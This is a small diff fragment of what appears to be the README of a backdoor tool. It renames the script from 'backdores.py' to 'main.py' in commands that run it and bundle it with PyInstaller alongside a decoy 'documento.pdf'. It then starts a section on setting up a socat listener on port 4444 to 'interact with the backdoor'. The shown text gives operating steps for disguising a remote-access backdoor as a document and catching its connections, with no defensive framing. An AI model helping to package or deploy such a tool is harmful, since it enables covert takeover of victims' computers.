@@ -38,11 +38,11 @@ PORT = 4444
 Run the script:
 
 bash
-python backdores.py
+python main.py
 Or bundle it with PyInstaller:
 
 bash
-pyinstaller --onefile --add-data "documento.pdf;." backdores.py
+pyinstaller --onefile --add-data "documento.pdf;." main.py
 2. Set Up the Listener with socat
 To receive connections and interact with the backdoor, use socat:
 
